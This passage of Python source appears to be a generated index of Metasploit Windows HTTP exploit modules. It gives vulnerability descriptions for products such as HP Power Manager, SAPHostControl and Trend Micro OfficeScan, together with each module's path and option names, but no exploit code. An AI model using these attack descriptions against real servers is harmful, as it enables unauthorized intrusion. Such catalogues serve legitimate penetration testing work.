        then proceed to exploit the server. Successful exploits result in SYSTEM access.
        This exploit works on XP SP3, and Server 2003 SP1-SP2.
      
		"""

		path = 'windows/http/sysax_create_folder'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_TARGETURI = 'TARGETURI'
			required_SysaxUSER = 'SysaxUSER'
			required_SysaxPASS = 'SysaxPASS'

	class windows_http_hp_autopass_license_traversal(object):
		"""
		
        This module exploits a code execution flaw in HP AutoPass License Server. It abuses two
        weaknesses in order to get its objective. First, the AutoPass application doesn't enforce
        authentication in the CommunicationServlet component. Seond, it's possible to abuse a
        directory traversal when uploading files thorough the same component, allowing to upload
        an arbitrary payload embedded in a JSP. The module has been tested successfully on
        HP AutoPass License Server 8.01 as installed with HP Service Virtualization 3.50.
      
		"""

		path = 'windows/http/hp_autopass_license_traversal'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'
			INSTALL_DEPTH = 'INSTALL_DEPTH'
			INSTALL_FOLDER = 'INSTALL_FOLDER'
			WEBAPPS_DEPTH = 'WEBAPPS_DEPTH'

	class windows_http_miniweb_upload_wbem(object):
		"""
		
        This module exploits a vulnerability in MiniWeb HTTP server (build 300).
        The software contains a file upload vulnerability that allows an
        unauthenticated remote attacker to write arbitrary files to the file system.

        Code execution can be achieved by first uploading the payload to the remote
        machine as an exe file, and then upload another mof file, which enables
        WMI (Management Instrumentation service) to execute the uploaded payload.
        Please note that this module currently only works for Windows before Vista.
      
		"""

		path = 'windows/http/miniweb_upload_wbem'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_DEPTH = 'DEPTH'

	class windows_http_netdecision_http_bof(object):
		"""
		
          This module exploits a vulnerability found in NetDecision's HTTP service
        (located in C:/Program Files/NetDecision/Bin/HttpSvr.exe).  By supplying a
        long string of data to the URL, an overflow may occur if the data gets handled
        by HTTP Server's active window.  In other words, in order to gain remote code
        execution, the victim is probably looking at HttpSvr's window.
      
		"""

		path = 'windows/http/netdecision_http_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_steamcast_useragent(object):
		"""
		
          This module exploits a stack buffer overflow in Streamcast <= 0.9.75. By sending
          an overly long User-Agent in an HTTP GET request, an attacker may be able to
          execute arbitrary code.
      
		"""

		path = 'windows/http/steamcast_useragent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_hp_nnm_webappmon_ovjavalocale(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53.
        By sending a request continaing a cookie longer than 5120 bytes, an attacker can overflow
        a stack buffer and execute arbitrary code.

        The vulnerable code is within the OvWwwDebug function. The static-sized stack buffer is
        declared within this function. When the vulnerability is triggered, the stack trace looks
        like the following:

          #0 ...
          #1 sprintf_new(local_stack_buf, fmt, cooke);
          #2 OvWwwDebug("   HTTP_COOKIE=%s/n", cookie);
          #3 ?OvWwwInit@@YAXAAHQAPADPBD@Z(x, x, x);
          #4 sub_405ee0("nnm", "webappmon");

        No validation is done on the cookie argument. There are no stack cookies, so exploitation
        is easily achieved by overwriting the saved return address or SEH frame.

        The original advisory detailed an attack vector using the "OvJavaLocale" cookie being
        passed in a request ot "webappmon.exe". Further research shows that several different
        cookie values, as well as several different CGI applications, can be used.
      '
		"""

		path = 'windows/http/hp_nnm_webappmon_ovjavalocale'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			COOKIE = 'COOKIE'
			CGI = 'CGI'

	class windows_http_ca_totaldefense_regeneratereports(object):
		"""
		
          This module exploits a SQL injection flaw in CA Total Defense Suite R12.
        When supplying a specially crafted soap request to '/UNCWS/Management.asmx', an
        attacker can abuse the reGenerateReports stored procedure by injecting arbitrary sql
        statements into the ReportIDs element.

      
		"""

		path = 'windows/http/ca_totaldefense_regeneratereports'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			CMD = 'CMD'

	class windows_http_hp_power_manager_login(object):
		"""
		
          This module exploits a stack buffer overflow in Hewlett-Packard Power Manager 4.2.
        Sending a specially crafted POST request with an overly long Login string, an
        attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/hp_power_manager_login'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_mcafee_epolicy_source(object):
		"""
		
          This is an exploit for the McAfee HTTP Server (NAISERV.exe).
        McAfee ePolicy Orchestrator 2.5.1 <= 3.5.0 and ProtectionPilot 1.1.0 are
        known to be vulnerable. By sending a large 'Source' header, the stack can
        be overwritten. This module is based on the exploit by xbxice and muts.
        Due to size constraints, this module uses the Egghunter technique.
      
		"""

		path = 'windows/http/mcafee_epolicy_source'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_sap_host_control_cmd_exec(object):
		"""
		
          This module exploits a command injection vulnerability in the SAPHostControl
        Service, by sending a specially crafted SOAP request to the management console.

        In order to deal with the spaces and length limitations, a WebDAV service is
        created to run an arbitrary payload when accessed as a UNC path. Because of this,
        the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.
        It is enabled and automatically started by default on Windows XP SP3, but disabled
        by default on Windows 2003 SP2.
      
		"""

		path = 'windows/http/sap_host_control_cmd_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_http_ericom_access_now_bof(object):
		"""
		
        This module exploits a stack based buffer overflow in Ericom AccessNow Server. The
        vulnerability is due to an insecure usage of vsprintf with user controlled data,
        which can be triggered with a malformed HTTP request. This module has been tested
        successfully with Ericom AccessNow Server 2.4.0.2 on Windows XP SP3 and Windows 2003
        Server SP2.
      
		"""

		path = 'windows/http/ericom_access_now_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_trendmicro_officescan(object):
		"""
		
          This module exploits a stack buffer overflow in Trend Micro OfficeScan
        cgiChkMasterPwd.exe (running with SYSTEM privileges).
      
		"""

		path = 'windows/http/trendmicro_officescan'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
